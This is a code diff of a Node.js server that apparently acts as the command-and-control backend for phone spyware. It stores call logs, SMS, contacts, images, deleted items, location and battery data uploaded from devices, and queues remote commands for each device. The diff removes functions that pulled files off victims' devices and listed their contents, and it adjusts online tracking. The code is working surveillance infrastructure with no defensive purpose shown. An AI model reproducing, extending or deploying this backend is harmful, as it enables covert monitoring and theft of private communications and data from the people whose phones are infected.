@@ -42,39 +42,18 @@ app.post('/upload.php', (req, res) => {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
             if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            
             const deletedFile = path.join(deviceDir, 'deleted_data.json');
             let deleted = [];
             if (fs.existsSync(deletedFile)) deleted = JSON.parse(fs.readFileSync(deletedFile, 'utf8'));
+            
             if (data.deleted_items && data.deleted_items.length > 0) {
                 deleted = [...data.deleted_items, ...deleted];
             }
+            
             fs.writeFileSync(deletedFile, JSON.stringify(deleted, null, 2));
             updateDevicesList(deviceId, null);
             return res.json({ success: true, deleted_count: deleted.length });
-        }
-        
-        // ✅ حفظ الملفات
-        if (data.type === 'file_data') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            const filesFile = path.join(deviceDir, 'downloaded_files.json');
-            let files = [];
-            if (fs.existsSync(filesFile)) files = JSON.parse(fs.readFileSync(filesFile, 'utf8'));
-            files.push({ name: data.file_name, path: data.file_path, size: data.file_size, data: data.file_data, date: data.timestamp });
-            fs.writeFileSync(filesFile, JSON.stringify(files, null, 2));
-            updateDevicesList(deviceId, null);
-            return res.json({ success: true, files_count: files.length });
-        }
-        
-        // ✅ حفظ قائمة الملفات
-        if (data.type === 'file_list') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            const fileListFile = path.join(deviceDir, 'file_list.json');
-            fs.writeFileSync(fileListFile, JSON.stringify({ path: data.path, files: data.files, timestamp: Date.now() }, null, 2));
-            return res.json({ success: true });
         }
         
         // ✅ البيانات العادية
@@ -87,7 +66,6 @@ app.post('/upload.php', (req, res) => {
         if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
         
         if (data.data) {
-            // ✅ دمج المكالمات + إزالة تكرار + ترتيب
             if (data.data.call_logs && data.data.call_logs.length > 0) {
                 if (!existingData.call_logs) existingData.call_logs = [];
                 const merged = [...data.data.call_logs, ...existingData.call_logs];
@@ -101,7 +79,6 @@ app.post('/upload.php', (req, res) => {
                 existingData.call_logs = unique;
             }
             
-            // ✅ دمج الرسائل + إزالة تكرار + ترتيب
             if (data.data.sms && data.data.sms.length > 0) {
                 if (!existingData.sms) existingData.sms = [];
                 const merged = [...data.data.sms, ...existingData.sms];
@@ -164,15 +141,13 @@ app.get('/live.php', (req, res) => {
         const dataFile = path.join(dataDir, deviceId, 'data.json');
         const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
         const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
-        const filesFile = path.join(dataDir, deviceId, 'downloaded_files.json');
         
-        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0, deleted_count: 0, files_count: 0 };
+        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0, deleted_count: 0 };
         
         if (fs.existsSync(liveFile)) {
             const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
             const lastSeen = live.last_seen || 0;
-            // ✅ 300 ثانية = 5 دقائق
-            response.online = (Math.floor(Date.now()/1000) - lastSeen) < 300;
+            response.online = (Math.floor(Date.now()/1000) - lastSeen) < 120;
             response.network = live.network || 'غير معروف';
             response.battery = live.battery || null;
             response.location = live.location || null;
@@ -196,10 +171,6 @@ app.get('/live.php', (req, res) => {
             response.deleted_count = JSON.parse(fs.readFileSync(deletedFile, 'utf8')).length;
         }
         
-        if (fs.existsSync(filesFile)) {
-            response.files_count = JSON.parse(fs.readFileSync(filesFile, 'utf8')).length;
-        }
-        
         res.json(response);
     } catch (e) { res.json({ error: e.message }); }
 });
@@ -217,11 +188,13 @@ app.get('/api.php', (req, res) => {
             let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
             devices = devices.filter(d => d.id !== deviceId);
             fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
+            
             const resetFile = path.join(dataDir, 'reset_commands.json');
             let resets = [];
             if (fs.existsSync(resetFile)) resets = JSON.parse(fs.readFileSync(resetFile, 'utf8'));
             resets.push({ device_id: deviceId, timestamp: Date.now() });
             fs.writeFileSync(resetFile, JSON.stringify(resets));
+            
             return res.json({ success: true });
         }
         
@@ -245,22 +218,11 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
         
+        // ✅ استرجاع المحذوفات
         if (action === 'get_deleted') {
             const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
             if (fs.existsSync(deletedFile)) return res.json(JSON.parse(fs.readFileSync(deletedFile, 'utf8')));
             return res.json([]);
-        }
-        
-        if (action === 'get_files') {
-            const filesFile = path.join(dataDir, deviceId, 'downloaded_files.json');
-            if (fs.existsSync(filesFile)) return res.json(JSON.parse(fs.readFileSync(filesFile, 'utf8')));
-            return res.json([]);
-        }
-        
-        if (action === 'get_file_list') {
-            const fileListFile = path.join(dataDir, deviceId, 'file_list.json');
-            if (fs.existsSync(fileListFile)) return res.json(JSON.parse(fs.readFileSync(fileListFile, 'utf8')));
-            return res.json({ path: '/', files: [] });
         }
         
         if (action === 'get_data') {
@@ -297,19 +259,7 @@ app.post('/api.php', (req, res) => {
         const commandsFile = path.join(deviceDir, 'commands.json');
         let commands = [];
         if (fs.existsSync(commandsFile)) commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
-        
-        if (command.startsWith('list_files:')) {
-            const filePath = command.replace('list_files:', '');
-            commands.push({ command: 'list_files', path: filePath, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
-        }
-        else if (command.startsWith('download_file:')) {
-            const filePath = command.replace('download_file:', '');
-            commands.push({ command: 'download_file', path: filePath, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
-        }
-        else {
-            commands.push({ command, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
-        }
-        
+        commands.push({ command, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
         fs.writeFileSync(commandsFile, JSON.stringify(commands));
         res.json({ success: true });
     } catch (e) { res.json({ error: e.message }); }
